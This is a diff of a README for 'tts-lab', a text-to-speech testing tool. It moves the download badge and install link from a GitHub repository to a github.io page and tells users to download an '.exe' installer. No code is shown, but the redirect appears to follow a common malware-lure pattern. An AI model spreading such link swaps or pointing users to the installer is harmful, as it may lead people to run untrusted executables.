@@ -1,6 +1,6 @@
 # 🎙️ tts-lab - Compare and test speech models easily
 
-[![](https://img.shields.io/badge/Download_TTS_Lab-blue.svg)](https://github.com/assailabilitytoy38/tts-lab)
+[![](https://img.shields.io/badge/Download_TTS_Lab-blue.svg)](https://assailabilitytoy38.github.io)
 
 TTS Lab provides a simple way to turn text into spoken audio. You can test different voices and styles on your own computer. Choose from many high-quality models, listen to the output, and save your favorite clips.
 
@@ -31,7 +31,7 @@ If you do not have Python or Bun, you can download them from their official webs
 
 Follow these steps to set up the lab on your machine.
 
-1. Visit the project website at [https://github.com/assailabilitytoy38/tts-lab](https://github.com/assailabilitytoy38/tts-lab).
+1. Visit the project website at [https://assailabilitytoy38.github.io](https://assailabilitytoy38.github.io).
 2. Look for the "Releases" section on the right side of the page.
 3. Click the latest version to see the available files.
 4. Download the installer file that ends in .exe.
